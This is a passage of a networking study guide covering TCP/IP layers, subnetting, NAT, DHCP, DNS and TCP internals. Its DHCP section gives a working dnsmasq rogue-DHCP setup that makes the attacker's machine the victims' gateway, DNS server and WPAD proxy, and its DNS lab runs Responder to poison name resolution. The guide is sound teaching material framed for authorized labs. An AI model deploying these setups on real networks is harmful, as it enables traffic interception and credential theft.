# Networking Deep Dive: TCP/IP Model & Network Devices
### For DevOps, Cybersecurity & Cloud Engineers

> **Cross-Reference:** This document builds on top of `OSI_Model_Deep_Dive.md`. Theory already covered there (ARP spoofing, port scanning, SYN floods, OSI encapsulation, individual protocol definitions) is referenced rather than repeated. This file focuses on **what TCP/IP adds that OSI doesn't**, and **deep-dives into network devices**.

> **Lab Disclaimer:** All offensive techniques are for controlled, authorized lab environments only (your own VMs, Metasploitable, HackTheBox, TryHackMe). Never test systems you don't own.

---

## Table of Contents

### SECTION 1: TCP/IP Model Deep Dive
1. [What TCP/IP Is — and Why It's Not OSI](#1-what-tcpip-is--and-why-its-not-osi)
2. [The 4-Layer TCP/IP Architecture](#2-the-4-layer-tcpip-architecture)
3. [IP Addressing — Deep Internals](#3-ip-addressing--deep-internals)
4. [Subnetting — The Skill Every Engineer Must Own](#4-subnetting--the-skill-every-engineer-must-own)
5. [CIDR, Route Aggregation & Longest Prefix Match](#5-cidr-route-aggregation--longest-prefix-match)
6. [NAT — Network Address Translation](#6-nat--network-address-translation)
7. [DHCP — Dynamic Host Configuration Protocol](#7-dhcp--dynamic-host-configuration-protocol)
8. [DNS — The Internet's Phone Book (Deep Internals)](#8-dns--the-internets-phone-book-deep-internals)
9. [TCP Internals — Beyond the Handshake](#9-tcp-internals--beyond-the-handshake)
10. [UDP Internals & Use Cases](#10-udp-internals--use-cases)
11. [ICMP — More Than Just Ping](#11-icmp--more-than-just-ping)
12. [IPv6 — Architecture, Security & Migration](#12-ipv6--architecture-security--migration)
13. [Routing Protocols Deep Dive](#13-routing-protocols-deep-dive)
14. [TCP/IP Attack Surface Unique to This Model](#14-tcpip-attack-surface-unique-to-this-model)

### SECTION 2: Network Devices Deep Dive
15. [Hubs](#15-hubs)
16. [Switches](#16-switches)
17. [Routers](#17-routers)
18. [Firewalls](#18-firewalls)
19. [Load Balancers](#19-load-balancers)
20. [Proxy Servers](#20-proxy-servers)
21. [IDS / IPS](#21-ids--ips)
22. [VPN Gateways](#22-vpn-gateways)
23. [Wireless Access Points](#23-wireless-access-points)
24. [Wireless LAN Controllers (WLC)](#24-wireless-lan-controllers-wlc)
25. [Network Attached Storage (NAS)](#25-network-attached-storage-nas)
26. [Storage Area Networks (SAN)](#26-storage-area-networks-san)
27. [Content Delivery Networks (CDN)](#27-content-delivery-networks-cdn)
28. [Network Taps & Packet Brokers](#28-network-taps--packet-brokers)
29. [Device Attack Surface Summary](#29-device-attack-surface-summary)

---

# SECTION 1: TCP/IP MODEL DEEP DIVE

---

## 1. What TCP/IP Is — and Why It's Not OSI

### Layman's Terms
OSI is a **textbook blueprint** — perfectly organized, never actually built exactly as written. TCP/IP is the **actual building** that the internet runs on. It was designed by DARPA in the 1970s to survive nuclear war (seriously — the goal was a network that could reroute around destroyed nodes). It's messier than OSI, but it's what every packet on earth actually uses.

### Real-World Analogy
OSI is like a city's **official zoning map** — perfectly organized zones for residential, commercial, industrial. TCP/IP is the **actual city** — some things overlap, some zones don't match the map, but traffic still flows and commerce still happens.

### Formal Definition
The **TCP/IP model** (also called the **Internet Model** or **DoD model**) is a concise, four-layer framework that describes how data is transmitted over interconnected networks. It was developed from ARPANET research in the 1970s and formalized in RFC 1122 (1989). Unlike OSI's 7 theoretical layers, TCP/IP collapses Session (L5), Presentation (L6), and Application (L7) into a single Application layer, and merges Physical (L1) and Data Link (L2) into a Network Access layer.

### Why TCP/IP Won Over OSI

| Factor | OSI | TCP/IP |
|--------|-----|--------|
| Origin | ISO committee (1984) | DARPA research (1974) |
| Design philosophy | Prescriptive, top-down | Pragmatic, bottom-up |
| Implementation | Rarely implemented as-is | Internet runs on it |
| Flexibility | Rigid layer boundaries | Blurred, practical |
| Adoption | Academic reference | Universal standard |

```
OSI (7 layers)          TCP/IP (4 layers)       Real protocols
──────────────          ─────────────────       ──────────────
7 Application  ┐
6 Presentation ├────►   Application        ←── HTTP, HTTPS, DNS,
5 Session      ┘                                SSH, SMTP, FTP,
                                                SNMP, DHCP, NTP
4 Transport    ─────►   Transport          ←── TCP, UDP, SCTP

3 Network      ─────►   Internet           ←── IPv4, IPv6,
                                                ICMP, BGP, OSPF,
                                                EIGRP, RIP

2 Data Link    ┐
1 Physical     ├────►   Network Access     ←── Ethernet, Wi-Fi,
               ┘                                ARP, PPP, Frame Relay
```

---

## 2. The 4-Layer TCP/IP Architecture

### Layer Responsibilities (What OSI File Didn't Cover)

**Network Access Layer (L1+L2 combined)**

This layer owns something OSI treats separately: the interaction between software and hardware. In TCP/IP, it's pragmatic — if a frame can get to the next hop, that's all that matters. Key additions over OSI theory:

- **ARP is officially part of this layer** in TCP/IP (not cleanly placed in OSI L2 or L3)
- **MTU negotiation** happens here — Maximum Transmission Unit (1500 bytes for Ethernet)
- **Frame types coexist**: Ethernet II (most common), 802.3, 802.1Q tagged frames

```
Ethernet II Frame (the dominant format):
┌──────────┬──────────┬──────┬────────────────────┬─────┐
│ Dst MAC  │ Src MAC  │EtherT│      Payload        │ FCS │
│ 6 bytes  │ 6 bytes  │2 byte│   46–1500 bytes     │4 B  │
└──────────┴──────────┴──────┴────────────────────┴─────┘

EtherType values (critical for packet analysis):
  0x0800 = IPv4
  0x0806 = ARP
  0x86DD = IPv6
  0x8100 = 802.1Q VLAN tagged
  0x88CC = LLDP
  0x8847 = MPLS unicast
```

**Internet Layer (L3)**

The heart of TCP/IP. What OSI didn't fully explain: this layer makes **independent forwarding decisions for every single packet**. TCP/IP is a **connectionless, best-effort delivery system at L3** — IP itself has no idea if a packet arrived. That reliability job belongs entirely to TCP at L4.

**Transport Layer (L4)**

See the OSI file for TCP/UDP basics. What we'll add here: **TCP state machine, flow control mechanics, congestion control algorithms, and SCTP**.

**Application Layer (L5–L7 collapsed)**

The application handles everything OSI called sessions, presentation, and application. In practice, TLS sits here as a shim between TCP and HTTP — which is why "where does TLS live in OSI vs TCP/IP" is a common interview trap.

```
TLS placement debate:
OSI:    TLS = L6 (Presentation) + L5 (Session)
TCP/IP: TLS = between Transport and Application
Reality: TLS wraps the TCP stream before the application
         sees it. It's a library call, not a "layer."

HTTP over TLS (HTTPS) stack:
  ┌─────────────────┐
  │   HTTP (L7)     │  ← Application data: GET /index.html
  ├─────────────────┤
  │   TLS Record    │  ← Encryption + MAC
  ├─────────────────┤
  │   TCP (L4)      │  ← Reliable delivery, ports
  ├─────────────────┤
  │   IP (L3)       │  ← Routing
  ├─────────────────┤
  │   Ethernet (L2) │  ← Local delivery
  └─────────────────┘
```

---

## 3. IP Addressing — Deep Internals

### Layman's Terms
An IP address is like a **mailing address for your computer on a network**. Your house has a street address — your device has an IP address. The difference: IP addresses can be temporary, shared (via NAT), or virtual. There's a lot more going on under the hood.

### IPv4 Address Classes (Historical, But Still Relevant for Exams & Firewalls)

```
Class A: 1.0.0.0   – 126.0.0.0    /8   (16M hosts per network)
         First bit: 0
         Used by: Large ISPs, governments
         
Class B: 128.0.0.0 – 191.255.0.0  /16  (65K hosts per network)
         First bits: 10
         Used by: Universities, mid-size orgs
         
Class C: 192.0.0.0 – 223.255.255.0 /24 (254 hosts per network)
         First bits: 110
         Used by: Small businesses, home networks
         
Class D: 224.0.0.0 – 239.255.255.255   MULTICAST
         Used by: OSPF (224.0.0.5/6), RIP (224.0.0.9), video streaming
         
Class E: 240.0.0.0 – 255.255.255.255   RESEARCH/RESERVED

Special addresses:
  127.0.0.0/8     = Loopback (127.0.0.1 = localhost)
  0.0.0.0         = "This host" (used in DHCP DISCOVER)
  255.255.255.255 = Limited broadcast (never routed)
  169.254.0.0/16  = APIPA (auto-assigned when DHCP fails)
```

### RFC 1918 Private Address Space (Critical for Security Engineers)

```
10.0.0.0/8       = Class A private  (16,777,214 hosts)
172.16.0.0/12    = Class B private  (1,048,574 hosts)
192.168.0.0/16   = Class C private  (65,534 hosts)

Security implication: These addresses should NEVER appear
as source IPs on the public internet. If you see them in
external traffic → spoofed packet or misconfigured firewall.

iptables rule to drop spoofed private IPs on public interface:
iptables -A INPUT -i eth0 -s 10.0.0.0/8 -j DROP
iptables -A INPUT -i eth0 -s 172.16.0.0/12 -j DROP
iptables -A INPUT -i eth0 -s 192.168.0.0/16 -j DROP
```

### Other Special Ranges (Often Missed)

| Range | Purpose | Security Note |
|-------|---------|---------------|
| `100.64.0.0/10` | Shared address space (ISP CGN) | RFC 6598 — can confuse logging |
| `192.0.2.0/24` | TEST-NET-1 (documentation) | Should never appear in prod |
| `198.51.100.0/24` | TEST-NET-2 | Same — if seen, something's wrong |
| `203.0.113.0/24` | TEST-NET-3 | Same |
| `224.0.0.0/4` | Multicast | Routers don't forward by default |
| `240.0.0.0/4` | Reserved | Drop all traffic to/from this |

---

## 4. Subnetting — The Skill Every Engineer Must Own

### Layman's Terms
Subnetting is like **dividing a big apartment building into floors**. The building has one address (network address), but each floor has its own apartments (hosts). Subnetting lets you split one large IP block into smaller, manageable pieces for security, performance, and organization.

### Real-World Use Case
A bank has the 10.0.0.0/8 network. They subnet it:
- `10.1.0.0/16` → Branch offices
- `10.2.0.0/16` → ATM network (isolated for PCI-DSS compliance)
- `10.3.0.0/16` → Employee workstations
- `10.4.0.0/16` → Data center servers
- `10.5.0.0/16` → Security cameras (isolated VLAN + subnet)

This segmentation means a compromised ATM can't directly reach HR servers.

### The Subnet Math (The Part Everyone Struggles With)

```
IP Address:     192.168.10.50
Subnet Mask:    255.255.255.0  (/24)

Binary breakdown:
IP:   11000000.10101000.00001010.00110010
Mask: 11111111.11111111.11111111.00000000
      ─────────────────────────┬─────────
                          Network │  Host
                          portion │ portion

Network Address:  192.168.10.0   (host bits all 0)
Broadcast:        192.168.10.255 (host bits all 1)
First Host:       192.168.10.1
Last Host:        192.168.10.254
Total hosts:      254 (2^8 - 2)
```

### VLSM — Variable Length Subnet Masking

The real-world technique: assign different subnet sizes based on need.

```
Problem: You have 192.168.1.0/24. Divide it for:
  - HQ office:     100 hosts needed
  - Branch 1:       50 hosts needed
  - Branch 2:       25 hosts needed
  - Point-to-point:  2 hosts needed (router links)

Solution (VLSM):
  HQ:     192.168.1.0/25    → 126 hosts  (128-2)
  Br1:    192.168.1.128/26  → 62 hosts   (64-2)
  Br2:    192.168.1.192/27  → 30 hosts   (32-2)
  P2P:    192.168.1.224/30  → 2 hosts    (4-2)
  Spare:  192.168.1.228/30  → reserved
  ...etc

No IP space wasted. A /24 split into purpose-built pieces.
```

### Subnet Cheat Sheet

| CIDR | Subnet Mask | Hosts | # of /24 subnets |
|------|-------------|-------|------------------|
| /8 | 255.0.0.0 | 16,777,214 | 65,536 |
| /16 | 255.255.0.0 | 65,534 | 256 |
| /24 | 255.255.255.0 | 254 | 1 |
| /25 | 255.255.255.128 | 126 | — |
| /26 | 255.255.255.192 | 62 | — |
| /27 | 255.255.255.224 | 30 | — |
| /28 | 255.255.255.240 | 14 | — |
| /29 | 255.255.255.248 | 6 | — |
| /30 | 255.255.255.252 | 2 | — (point-to-point) |
| /31 | 255.255.255.254 | 2 | RFC 3021 (P2P only) |
| /32 | 255.255.255.255 | 1 | Single host route |

### Hands-On Lab: Subnetting with ipcalc and Python

```bash
# Install ipcalc
sudo apt install ipcalc -y

# Detailed subnet info
ipcalc 192.168.10.50/26

# Output:
# Address:   192.168.10.50       11000000.10101000.00001010.00 110010
# Netmask:   255.255.255.192 = 26 11111111.11111111.11111111.11 000000
# Wildcard:  0.0.0.63             00000000.00000000.00000000.00 111111
# Network:   192.168.10.0/26      ...
# HostMin:   192.168.10.1
# HostMax:   192.168.10.62
# Broadcast: 192.168.10.63
# Hosts/Net: 62

# Python subnet calculator
python3 -c "
import ipaddress
net = ipaddress.IPv4Network('192.168.10.0/26', strict=False)
print(f'Network:   {net.network_address}')
print(f'Broadcast: {net.broadcast_address}')
print(f'Hosts:     {net.num_addresses - 2}')
print(f'First:     {list(net.hosts())[0]}')
print(f'Last:      {list(net.hosts())[-1]}')

# Split into 4 equal subnets
for subnet in net.subnets(prefixlen_diff=2):
    print(subnet)
"

# Nmap uses CIDR notation for scanning — scan a subnet:
sudo nmap -sn 192.168.1.0/24 --open
```

---

## 5. CIDR, Route Aggregation & Longest Prefix Match

### Layman's Terms
**CIDR** (Classless Inter-Domain Routing) killed the old rigid class system. Instead of only /8, /16, /24, you can have any prefix length. **Route aggregation** is like telling the postal service "for all addresses in ZIP codes 10000–10099, send them to the same sorting facility" — one rule covers many addresses. **Longest prefix match** is how routers decide which route to use when multiple routes match.

### Route Aggregation (Supernetting)

```
Problem: You have these 4 networks to advertise via BGP:
  203.0.113.0/24
  203.0.114.0/24
  203.0.115.0/24
  203.0.116.0/24

Instead of advertising 4 routes, aggregate to 1:
  203.0.112.0/21   (covers .112 through .119 /24s)

Binary proof:
  203.0.113 = 11001011.00000000.01110001
  203.0.116 = 11001011.00000000.01110100
              ─────────────────────────
  Common:     11001011.00000000.01110   (first 21 bits match)
  Summary:    203.0.112.0/21

Security impact: Overly broad aggregation can accidentally
advertise more IP space than you own → BGP hijack risk.
```

### Longest Prefix Match — The Core Router Decision

```
Router's routing table:
  Route 1:  0.0.0.0/0        → Gateway 10.0.0.1   (default)
  Route 2:  192.168.0.0/16   → Interface eth1
  Route 3:  192.168.1.0/24   → Interface eth2
  Route 4:  192.168.1.128/25 → Interface eth3

Packet arrives destined for 192.168.1.200:

Match Route 1?  0.0.0.0/0      → YES (0 bits match)
Match Route 2?  192.168.0.0/16 → YES (16 bits match)
Match Route 3?  192.168.1.0/24 → YES (24 bits match)
Match Route 4?  192.168.1.128/25 → YES (25 bits match) ← WINNER

Longest prefix wins. Packet goes out eth3.

This is why a /32 "host route" always wins over any summary route.
Security abuse: Attackers with BGP access can inject a /24 to
"steal" traffic from your /8 — the /24 is more specific, it wins.
```

---

## 6. NAT — Network Address Translation

### Layman's Terms
NAT is like a **company receptionist**. Employees (private IPs) use internal extension numbers, but to the outside world, everyone appears to call from the same main number (public IP). The receptionist keeps a log of who called out and routes replies back to the right extension.

### Real-World Analogy & Event
Every home router does NAT. Your entire household (192.168.1.0/24) appears as **one IP** to the internet. This is why IPv4 hasn't run out even though there are billions of devices — NAT hid the shortage for decades.

In 2011, APNIC (Asia-Pacific) ran out of IPv4 addresses. Massive ISP-grade NAT (CGN — Carrier-Grade NAT) emerged, where even the "public" IP of home users is now NATted behind another NAT. This breaks many protocols.

### Types of NAT

```
1. STATIC NAT (One-to-One):
   Private: 10.0.0.5  ←→  Public: 203.0.113.5 (always)
   Use: DMZ servers that need a permanent public IP
   Security: Exposes the private IP 1:1 — no hiding

2. DYNAMIC NAT (Pool):
   10.0.0.5  → picks from pool 203.0.113.5–203.0.113.20
   Use: Multiple private hosts sharing a small pool of IPs
   Limitation: Pool exhausted = no new outbound connections

3. PAT / NAT Overload (Port Address Translation) — MOST COMMON:
   10.0.0.5:54231  → 203.0.113.1:1024  ─┐
   10.0.0.6:54232  → 203.0.113.1:1025  ─┤  Same public IP,
   10.0.0.7:54233  → 203.0.113.1:1026  ─┘  different ports
   
   This is what your home router does.
   One public IP supports ~65,535 simultaneous connections.
```

### NAT Translation Table

```
NAT Router keeps this state table:
┌──────────────────┬───────────────────┬────────────────────────┐
│ Internal         │ External (NAT)    │ Remote                 │
├──────────────────┼───────────────────┼────────────────────────┤
│ 10.0.0.5:54231   │ 203.0.113.1:10001 │ 172.217.0.46:443       │
│ 10.0.0.6:8080    │ 203.0.113.1:10002 │ 104.18.25.35:80        │
│ 10.0.0.10:22     │ 203.0.113.1:10003 │ 198.51.100.5:52100     │
└──────────────────┴───────────────────┴────────────────────────┘

Reply packet arrives at 203.0.113.1:10001
→ Look up table → forward to 10.0.0.5:54231
```

### NAT Security Implications

```
ADVANTAGE (Security):
  - Hides internal network topology from outside
  - Inbound connections blocked by default (no table entry = dropped)
  - Acts as a primitive stateful firewall

DISADVANTAGE (Security Bypass):
  - NAT traversal techniques (STUN, TURN, ICE) bypass NAT
    → Used by WebRTC, VoIP, P2P apps — and attackers
  - NAT breaks IPsec AH (Authentication Header) — changes IP header
  - Breaks peer-to-peer protocols unless explicitly handled
  - Log correlation nightmare: multiple private hosts appear as 1 IP
    → "Who accessed that malicious site?" is hard with shared NAT IP
  - Port forwarding misconfigurations open internal services to internet
```

### Hands-On Lab: NAT in Action

```bash
# View your current NAT'd connection tracking on Linux (iptables NAT)
sudo conntrack -L 2>/dev/null | head -20

# Or on most systems:
cat /proc/net/ip_conntrack 2>/dev/null | head -20

# Simulate PAT/masquerade (Linux router setup)
# Enable IP forwarding:
echo 1 > /proc/sys/net/ipv4/ip_forward

# Add NAT/masquerade rule (all traffic from 10.0.0.0/24 NAT'd via eth0):
sudo iptables -t nat -A POSTROUTING -s 10.0.0.0/24 -o eth0 -j MASQUERADE

# Verify NAT table:
sudo iptables -t nat -L -n -v

# Watch live connections being NAT'd:
sudo watch -n1 'conntrack -L 2>/dev/null | grep ESTABLISHED | wc -l'

# Port forwarding example (forward external port 8080 to internal 80):
sudo iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 8080 \
  -j DNAT --to-destination 192.168.1.100:80
```

---

## 7. DHCP — Dynamic Host Configuration Protocol

### Layman's Terms
DHCP is the **hotel check-in desk** of networking. When you arrive (connect to network), the desk hands you a room key (IP address), tells you the hotel rules (subnet mask, gateway, DNS servers), and says "your key expires in 24 hours — come back to renew it" (lease time).

### The DORA Process (Deep Dive)

```
DHCP Exchange: D.O.R.A.

Client (0.0.0.0)                    DHCP Server (192.168.1.1)
     │                                          │
     │── DISCOVER (broadcast 255.255.255.255) ─►│
     │   src: 0.0.0.0:68                        │
     │   dst: 255.255.255.255:67                │
     │   "I need an IP address!"                │
     │                                          │
     │◄── OFFER ─────────────────────────────── │
     │   "I offer you 192.168.1.50/24           │
     │    Gateway: 192.168.1.1                  │
     │    DNS: 8.8.8.8                          │
     │    Lease: 86400 seconds"                 │
     │                                          │
     │── REQUEST (still broadcast) ────────────►│
     │   "I accept your offer of 192.168.1.50"  │
     │   (broadcast so other DHCP servers know) │
     │                                          │
     │◄── ACK ───────────────────────────────── │
     │   "Confirmed. 192.168.1.50 is yours      │
     │    for 24 hours."                        │
     │                                          │
     │   [Client configures interface]          │

Lease renewal (at 50% of lease time):
     │── REQUEST (unicast to server) ──────────►│
     │◄── ACK ───────────────────────────────── │
     │   [Lease extended]                        │
```

### DHCP Options (The Hidden Power)

```
DHCP Options are key-value pairs sent with DHCP responses.
Security engineers must know these — they're abused constantly.

Option 1:   Subnet Mask          (255.255.255.0)
Option 3:   Router/Gateway       (192.168.1.1)
Option 6:   DNS Servers          (8.8.8.8, 8.8.4.4)
Option 12:  Hostname
Option 15:  Domain Name          (company.local)
Option 28:  Broadcast Address
Option 42:  NTP Servers
Option 43:  Vendor Specific Info (used by Cisco WLC, PXE boot)
Option 51:  Lease Time           (86400 = 24 hours)
Option 53:  DHCP Message Type    (1=Discover,2=Offer,3=Req,5=ACK)
Option 54:  DHCP Server ID
Option 55:  Parameter Request List
Option 66:  TFTP Server (PXE boot!) ← Security risk
Option 67:  Bootfile Name (PXE)     ← Security risk
Option 82:  Relay Agent Info (added by DHCP relay agents)
Option 121: Classless Static Routes ← Can override routing tables!
Option 150: Cisco TFTP Server
Option 252: Web Proxy Autoconfiguration (WPAD) ← Major attack vector

Security alert on Option 252 (WPAD):
  Attacker runs rogue DHCP → sends WPAD option pointing to their server
  → Victim auto-configures proxy → ALL HTTP traffic flows through attacker
  This is the WPAD attack (still relevant in enterprise networks)
```

### DHCP Attacks

| Attack | Mechanism | Tool | Defense |
|--------|-----------|------|---------|
| **Rogue DHCP Server** | Attacker runs DHCP server, hands out malicious gateway/DNS | `dnsmasq`, `isc-dhcp-server` | DHCP Snooping on switches |
| **DHCP Starvation** | Flood server with DISCOVER using random MACs, exhaust IP pool | `dhcpstarv`, `yersinia` | Rate limiting, DHCP Snooping |
| **DHCP Poisoning** | Win the DORA race — reply faster than legit server | Manual timing attack | DHCP Snooping trusted ports |
| **WPAD Hijack** | Serve malicious proxy via Option 252 | `responder` | Disable WPAD, static proxy config |

### Hands-On Lab: Rogue DHCP Server & Detection

```bash
# Lab setup: Kali (192.168.1.50) on same network as victims

# Step 1: Set up rogue DHCP with dnsmasq
sudo apt install dnsmasq -y

cat > /tmp/rogue-dhcp.conf << 'EOF'
interface=eth0
dhcp-range=192.168.1.200,192.168.1.250,255.255.255.0,1h
dhcp-option=3,192.168.1.50      # Gateway = our Kali (MITM!)
dhcp-option=6,192.168.1.50      # DNS = our Kali (DNS hijack!)
dhcp-option=252,http://192.168.1.50/wpad.dat  # WPAD hijack
log-dhcp
EOF

sudo dnsmasq -C /tmp/rogue-dhcp.conf --no-daemon

# Step 2: Enable IP forwarding so traffic still reaches internet
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

# Step 3: Detect rogue DHCP servers on network
sudo nmap --script broadcast-dhcp-discover -e eth0

# Or use dhtest:
sudo apt install dhtest -y
sudo dhtest -i eth0 -v

# Step 4: Watch DHCP traffic in Wireshark
# Filter: bootp (DHCP uses BOOTP protocol)
# Look for multiple DHCP OFFERs from different MACs = rogue server present
```

---

## 8. DNS — The Internet's Phone Book (Deep Internals)

### Layman's Terms
DNS is the **phone book of the internet**. You know a person's name (google.com), but you need their phone number (IP address) to actually call them. DNS is what looks up that number. But unlike a printed phone book, DNS is distributed across millions of servers worldwide, cached, and can be poisoned.

### DNS Hierarchy & Resolution Chain

```
www.example.com resolution — full chain:

Browser asks: "What's the IP of www.example.com?"
                        │
                        ▼
          ┌─────────────────────────┐
          │  Local DNS Cache        │  ← Check browser cache first
          │  (TTL-based)            │
          └─────────────────────────┘
                  │ MISS
                  ▼
          ┌─────────────────────────┐
          │  OS Resolver Cache      │  ← Check /etc/hosts, then
          │  (/etc/resolv.conf)     │    OS-level DNS cache
          └─────────────────────────┘
                  │ MISS
                  ▼
          ┌─────────────────────────┐
          │  Recursive Resolver     │  ← Your ISP's or 8.8.8.8
          │  (configured via DHCP)  │    Does the heavy lifting
          └─────────────────────────┘
                  │ No cache → queries upward
                  ▼
          ┌─────────────────────────┐
          │  Root Nameserver        │  ← 13 root server clusters
          │  (a.root-servers.net)   │    "I don't know www.example.com
          └─────────────────────────┘     but .com NS is at Verisign"
                  │
                  ▼
          ┌─────────────────────────┐
          │  TLD Nameserver         │  ← Verisign handles .com
          │  (a.gtld-servers.net)   │    "example.com NS is at:
          └─────────────────────────┘     ns1.example.com"
                  │
                  ▼
          ┌─────────────────────────┐
          │  Authoritative NS       │  ← example.com's own DNS
          │  (ns1.example.com)      │    "www.example.com = 93.184.216.34"
          └─────────────────────────┘
                  │
                  ▼
          Resolver caches result (per TTL), returns to client
          
Full round-trip: ~100–300ms first time, <1ms from cache
```

### DNS Record Types (Complete Reference)

| Record | Description | Example | Security Notes |
|--------|-------------|---------|----------------|
| **A** | IPv4 address | `example.com → 93.184.216.34` | Most queried, most spoofed |
| **AAAA** | IPv6 address | `example.com → 2606:2800::1` | — |
| **CNAME** | Alias/canonical name | `www → example.com` | CNAME chains can bypass controls |
| **MX** | Mail exchanger | `example.com → mail.example.com` | Target for email spoofing attacks |
| **NS** | Nameserver | `example.com → ns1.example.com` | Zone delegation |
| **PTR** | Reverse DNS (IP→name) | `34.216.184.93 → example.com` | Used in spam filtering |
| **SOA** | Start of Authority | Admin info, serial, refresh | Zone transfer info disclosure |
| **TXT** | Free-form text | SPF, DKIM, DMARC, verification | Phishing defense lives here |
| **SRV** | Service locator | `_ldap._tcp → server:389` | Used by AD, SIP, XMPP |
| **CAA** | Cert Authority Authorization | Only Let's Encrypt can issue certs | Prevents rogue cert issuance |
| **DNSKEY** | DNSSEC public key | Zone signing key | |
| **DS** | Delegation Signer | DNSSEC chain of trust | |

### DNS Security Extensions & Anti-Spoofing

```
SPF Record (Sender Policy Framework):
  "Only these IPs may send email as @example.com"
  example.com TXT "v=spf1 ip4:93.184.216.34 include:_spf.google.com -all"
  -all = hard fail (reject if not listed)
  ~all = soft fail (mark as spam)
  
DKIM (DomainKeys Identified Mail):
  Email is cryptographically signed by sending server
  Recipient verifies signature via DNS TXT record
  
DMARC (Domain-based Message Authentication):
  "What to do if SPF/DKIM fail?"
  example.com TXT "v=DMARC1; p=reject; rua=mailto:dmarc@example.com"
  p=none/quarantine/reject
  
DNSSEC:
  Cryptographically signs DNS records — prevents cache poisoning
  Records are signed with zone's private key
  Resolvers verify with public key from parent zone
  
Reality check: Only ~20% of domains use DNSSEC.
Most DNS traffic is unsigned and can be poisoned.
```

### DNS Attacks Deep Dive

| Attack | Mechanism | Real Event | Tool |
|--------|-----------|-----------|------|
| **DNS Cache Poisoning** | Inject false records into resolver cache before legit response | Kaminsky Attack 2008 — could poison any resolver in <10s | `dnsspoof`, `ettercap` |
| **DNS Amplification DDoS** | Small query (60B) → large response (3000B) spoofed to victim | Spamhaus DDoS 2013 — 300 Gbps using open resolvers | `hping3`, Scapy |
| **DNS Tunneling** | Encode C2 traffic in DNS queries (exfiltration) | APT groups routinely use this to bypass egress firewalls | `dnscat2`, `iodine` |
| **Zone Transfer Abuse** | AXFR reveals entire DNS zone — all hostnames | Common misconfig in enterprise internal DNS | `dig axfr` |
| **NXDOMAIN Attack** | Flood resolver with random non-existent domains | Exhausts resolver CPU, degrades all DNS | Random domain generator |
| **DNS Rebinding** | Change DNS response after initial connection established | Bypass same-origin policy, reach internal services | `rbndr.us` (tool) |
| **Subdomain Takeover** | DNS points to cloud resource that no longer exists | Over 100 companies affected (Shopify, SendGrid subdomains) | `subjack`, `takeover` |

### Hands-On Lab: DNS Reconnaissance & Analysis

```bash
# 1. Basic DNS enumeration
dig example.com ANY
dig example.com A
dig example.com MX
dig example.com TXT

# 2. Reverse DNS lookup
dig -x 93.184.216.34

# 3. Check SPF/DMARC records
dig example.com TXT | grep spf
dig _dmarc.example.com TXT

# 4. Zone transfer attempt (harmless on most modern servers)
dig axfr @ns1.example.com example.com
# Modern servers reject this with "Transfer failed" — that's correct
# If it works → massive info leak (all hostnames exposed)

# 5. DNS enumeration with dnsrecon
dnsrecon -d example.com -t std
dnsrecon -d example.com -t brt -D /usr/share/wordlists/dnsmap.txt

# 6. Subdomain brute force
gobuster dns -d example.com -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt

# 7. DNS over HTTPS — see if target uses DoH (harder to intercept)
curl -H 'accept: application/dns-json' \
  'https://dns.google/resolve?name=example.com&type=A'

# 8. Check DNSSEC validation
dig +dnssec example.com A
# Look for "ad" flag in response = authenticated data (DNSSEC valid)

# 9. Simulate DNS cache poisoning detection
# Run responder to capture/poison DNS on local network:
sudo responder -I eth0 -wrf
# Poisons LLMNR, NBT-NS, MDNS — catches Windows machines auto-resolving names
```

---

## 9. TCP Internals — Beyond the Handshake

> **Reference:** For TCP three-way handshake, SYN flood, port scanning, and basic TCP header — see `OSI_Model_Deep_Dive.md`, Layer 4 section.

### TCP State Machine (Full)

```
TCP Connection State Diagram:

          CLOSED
            │ (passive open)        (active open)
            │ listen()              connect()
            ▼                          │
          LISTEN ◄──────────────────   │
            │                          │ SYN sent
            │ SYN received             ▼
            │                       SYN_SENT
            ▼ SYN+ACK sent             │
         SYN_RCVD ◄─────────────────  │ (SYN+ACK received)
            │                          │ ACK sent
            │ ACK received             │
            └──────────────────────────┘
                        │
                        ▼
                   ESTABLISHED  ←── Normal data transfer here
                        │
           ┌────────────┴──────────────┐
           │ (active close)            │ (passive close)
           │ close()                   │ FIN received
           ▼                           ▼
        FIN_WAIT_1                  CLOSE_WAIT
           │                           │
           │ FIN+ACK received          │ close()
           ▼                           ▼
        FIN_WAIT_2                  LAST_ACK
           │                           │
           │ FIN received              │ ACK received
           ▼                           ▼
        TIME_WAIT                   CLOSED
           │
           │ (2*MSL timeout = ~60s)
           ▼
         CLOSED

Security relevance:
  SYN_RCVD overload → SYN flood attack
  Too many TIME_WAIT → socket exhaustion
  
Check current TCP states:
  ss -tan | awk '{print $1}' | sort | uniq -c | sort -rn
```

### TCP Flow Control — Sliding Window

```
TCP prevents fast sender from overwhelming slow receiver
using a receive window (rwnd):

Sender                              Receiver
  │                                    │
  │  Window size = 4 segments          │
  │                                    │
  │──[Seg 1: bytes 1-1000]────────────►│
  │──[Seg 2: bytes 1001-2000]─────────►│
  │──[Seg 3: bytes 2001-3000]─────────►│
  │──[Seg 4: bytes 3001-4000]─────────►│
  │  (window full, must wait)          │
  │                                    │
  │◄─ ACK 4001, Window=3000 ───────────│
  │  (ACK'd 4000 bytes,                │
  │   new window = 3 segments)         │
  │                                    │
  │──[Seg 5: bytes 4001-5000]─────────►│
  ...

Window size in bytes is in TCP header.
Zero Window = receiver's buffer full → sender MUST stop
Window Probe = sender checks if window has reopened

Security: TCP Zero Window attacks can slow a connection
          to a crawl without fully terminating it.
```

### TCP Congestion Control Algorithms

```
TCP doesn't just respond to the receiver — it also responds
to NETWORK congestion. Four main algorithms:

1. SLOW START:
   cwnd (congestion window) starts at 1 MSS
   Doubles every RTT until ssthresh (slow start threshold)
   
2. CONGESTION AVOIDANCE:
   After ssthresh: increase cwnd by 1 MSS per RTT (linear)
   
3. FAST RETRANSMIT:
   3 duplicate ACKs = assume packet lost, retransmit immediately
   (don't wait for timeout)
   
4. FAST RECOVERY:
   After 3 dup ACKs: halve cwnd, continue with congestion avoidance
   (TCP Reno/CUBIC behavior)

Modern algorithms:
  TCP CUBIC (Linux default): Uses cubic function for faster recovery
  TCP BBR (Google): Bandwidth-delay product based, used in GCP
  TCP Vegas: RTT-based detection before packet loss
  
DevOps relevance: BBR dramatically improves throughput on
high-BDP links (satellite, intercontinental). Enable on Linux:
  sysctl -w net.ipv4.tcp_congestion_control=bbr
  
